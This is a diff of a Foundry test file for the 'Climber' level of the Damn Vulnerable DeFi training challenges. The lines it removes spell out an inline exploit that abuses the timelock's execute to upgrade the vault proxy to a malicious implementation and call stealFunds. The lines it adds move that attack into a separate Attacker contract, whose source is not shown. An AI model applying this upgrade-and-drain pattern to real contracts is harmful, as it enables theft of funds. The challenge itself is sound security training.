@@ -8,7 +8,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
-import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVaultV2.sol";
+import {Attacker} from "../../../src/Contracts/climber/Attacker.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -17,8 +17,8 @@ contract Climber is Test {
     DamnValuableToken internal dvt;
     ClimberTimelock internal climberTimelock;
     ClimberVault internal climberImplementation;
-    ClimberVaultV2 internal climberImplementation2;
     ERC1967Proxy internal climberVaultProxy;
+    Attacker internal attackerContract;
     address[] internal users;
     address payable internal deployer;
     address payable internal proposer;
@@ -91,34 +91,18 @@ contract Climber is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-        climberImplementation2 = new ClimberVaultV2();
-        address[] memory targets = new address[](1);
-        targets[0] = address(climberVaultProxy);
-        uint256[] memory values = new uint256[](1);
-        bytes[] memory datas = new bytes[](1);
 
-        values[0] = uint256(0);
-        bytes memory data = abi.encodeWithSignature(
-            "stealFunds(address,address)",
-            address(dvt),
-            attacker
+        attackerContract = new Attacker(
+            payable(address(climberTimelock)),
+            address(climberVaultProxy),
+            address(attacker),
+            address(dvt)
         );
-        datas[0] = abi.encodeWithSignature(
-            "upgradeToAndCall(address,bytes)",
-            address(climberImplementation2),
-            data
-        );
-        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
+
         vm.startPrank(attacker);
-        climberTimelock.execute(targets, values, datas, salt);
-        assertEq(0, climberTimelock.delay());
+        attackerContract.attack();
         vm.stopPrank();
-        /**
-         * EXPLOIT END *
-         */
+
         validation();
         console.log(
             unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
